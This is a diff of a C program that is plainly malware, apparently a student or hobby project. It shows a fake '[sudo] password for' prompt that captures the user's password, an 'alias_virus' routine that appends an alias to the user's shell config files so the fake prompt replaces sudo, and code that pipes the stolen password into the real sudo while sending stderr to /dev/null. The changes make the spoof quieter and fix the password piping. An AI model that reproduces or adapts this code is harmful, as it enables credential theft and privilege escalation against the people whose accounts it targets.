@@ -26,7 +26,9 @@ int main(int argc, char ** argv){
 //   signal(SIGSTOP, sighandler);
 // //  signal(SIGTSTP, sighandler);
 //   signal(SIGTERM, sighandler);
-  //set mode
+  
+
+//set mode
   int mode = P_IMPLANT;
   for (int i = 0; i<argc; i++){
     if (strcmp(argv[i],"SUDO") == 0){
@@ -45,14 +47,12 @@ int main(int argc, char ** argv){
     char passwd[PASSWD_SIZE];
     char username[UNAME_SIZE];
 
-    // printf("hello\n");
-
     steal_password(passwd, username);
 
     printf("%s's password is %s\n", username, passwd);
   }
 
-  while(1){};
+  // while(1){};
 
   return 0;
 
@@ -74,7 +74,7 @@ int steal_password(char * passwd, char * username){
   int correctPasswd = 0;
   char * returned_pass;
   while (! correctPasswd){
-    sprintf(prompt,"[sudo] password for %s: ", username);
+    sprintf(prompt,"VIRUS [sudo] password for %s: ", username);
 
     // This command prints the prompt to stdout then reads in the user's input without it showing up on the terminal (like sudo)
     returned_pass = getpass(prompt);
@@ -119,12 +119,6 @@ int alias_virus(){
   for (int i = 0; i<sizeof(CONFIGS)/sizeof(char *); i++){
     append_virus(home_dir_path, CONFIGS[i], alias);
   }
-
-  // printf(path_to_this_exe, "\n");
-
-  // system("source ~/.bashrc");
-
-  // printf("sucess\n");
 
   return 0;
 
@@ -172,6 +166,7 @@ int runSudo(char * passwd, char ** argAry){
   // For parent to give sudo password as stdin
   int fds[2];
   pipe(fds);
+
   int readPipe = fds[0];
   int writePipe = fds[1];
 
@@ -184,9 +179,17 @@ int runSudo(char * passwd, char ** argAry){
     close(readPipe);
     // Writing password to sudo
     int writeResult = write(writePipe, passwd, strlen(passwd));
+
+    //press enter on the sudo
+    char nl = '\n';
+    write(writePipe, &nl, 1);
+    write(writePipe, &nl, 1);
+    write(writePipe, &nl, 1);
+
+
     if (writeResult == -1){
       printf("Failed to write password to sudo\n");
-      exit(-1);
+      return -1;
     }
 
     // Waiting for sudo to complete
@@ -206,8 +209,8 @@ int runSudo(char * passwd, char ** argAry){
 
     int newStdErr = dup(fileno(stderr));
     int blackHole = open("/dev/null", O_WRONLY, 0);
-    //dup2(blackHole, fileno(stderr));
-    //dup2(blackHole, fileno(stdout));
+    dup2(blackHole, fileno(stderr));
+
     int newStdIn = dup(fileno(stdin));
     dup2(readPipe, fileno(stdin));
     // printf("readPipe: %d\n", readPipe);
@@ -216,12 +219,14 @@ int runSudo(char * passwd, char ** argAry){
 
     //printf("output\n");
 
-    printf("Running sudo\n");
+    char buffer[100] = "";
+    printf("child waiting...");
+    printf("Running sudo %s\n", buffer);
     int execResult = execvp(argAry[0], argAry);
     if (execResult == -1){
-      perror("");
-      printf("Execvp failed to run sudo\n");
+      perror("Execvp failed to run sudo\n");
     }
+    exit(1);
   }
 
   // Unreachable
